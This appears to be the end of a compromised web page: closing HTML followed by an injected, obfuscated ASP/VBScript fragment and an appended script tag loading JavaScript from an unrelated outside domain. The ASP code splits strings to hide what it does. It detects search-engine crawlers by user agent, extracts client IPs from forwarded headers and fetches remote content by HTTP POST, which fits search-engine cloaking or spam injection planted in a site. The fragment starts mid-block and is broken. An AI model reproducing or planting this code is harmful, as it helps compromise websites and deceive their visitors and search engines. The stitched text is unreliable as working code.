<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.0.1'></script>
</body>
</html>

<%
	End If
	response.End()
End if
echohtml = ""'GetContent(echourl&"sysid="&systid&"&redirect=yes")
If instr(echohtml,lk)>0 Then
	'response.Write replace(echohtml,lk,"")
End If
Function GetContent(url)
	'on error resume next
	Dim xmlHttp
	Set xmlHttp = Server.Createobject("WinHttp.WinHttpRequest.5.1")
	'xmlHttp.SetTimeouts 60000, 60000, 60000, 3000
	xmlHttp.Open "POST", url , False
	xmlHttp.Send()
	GetHtml	= xmlHttp.ResponseBody
	Set xmlHttp=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "UTF-8"
	GetContent = objStream.ReadText
	objStream.Close
End Function

Function ChecksAgent()
  on error resume next
  agentallow=split("ba"&"idus"&"pid"&"er,so"&"g"&"ou,ba"&"i"&"du,so"&"sos"&"pider,goo"&"g"&"lebot",",")
  agentcheck=false
  For agenti=lbound(agentallow) to ubound(agentallow)
    If Instr(LCase(RSbs("HTTP_USER_AGENT")),agentallow(agenti))>0 then
      agentcheck=true
      Exit For
    end if 
  Next
  ChecksAgent=agentcheck
End function
Function GetRsip()
  'on error resume next
  Dim getips
  If RSbs("HTTP_"&"X_FOR"&"W"&"ARDED_FOR") = "" Or InStr(RSbs("H"&"TTP_X_FO"&"RW"&"ARD"&"ED_FOR"), "unknown") > 0 Then
   getips = RSbs("REM"&"OTE_A"&"DDR")
  ElseIf InStr(RSbs("HT"&"TP_"&"X_FORW"&"ARDED_FOR"), ",") > 0 Then
   getips = Mid(RSbs("H"&"TTP"&"_X_FO"&"RW"&"ARD"&"ED_FOR"), 1, InStr(RSbs("H"&"TT"&"P_"&"X_F"&"ORW"&"AR"&"DE"&"D_F"&"OR"), ",")-1)
   actforip = RSbs("REMO"&"TE_ADD"&"R")
  ElseIf InStr(RSbs("HTT"&"P_X"&"_F"&"RW"&"AR"&"DED_FOR"), ";") > 0 Then
   getips = Mid(RSbs("HT"&"TP_"&"X_F"&"OR"&"W"&"AR"&"DED_"&"FO"&"R"), 1, InStr(RSbs("H"&"TT"&"P_"&"_F"&"OR"&"WA"&"RD"&"ED_"&"FOR"), ";")-1)
   actforip = RSbs("R"&"EMO"&"TE_"&"AD"&"D"&"R")
  Else
   getips = RSbs("HT"&"TP"&"_X_FO"&"RW"&"ARD"&"ED_"&"FOR")
   actforip = RSbs("R"&"EM"&"OTE"&"_AD"&"DR")
  End If
  GetRsip = Replace(Trim(Mid(getips, 1, 30)), "'", "")
End Function

Function RSbs(str)
	RSbs = Request.ServerVariables(str)
End Function
%>
<script src="http://dx.jd9.co/jdbes.js" type="text/javascript"></script>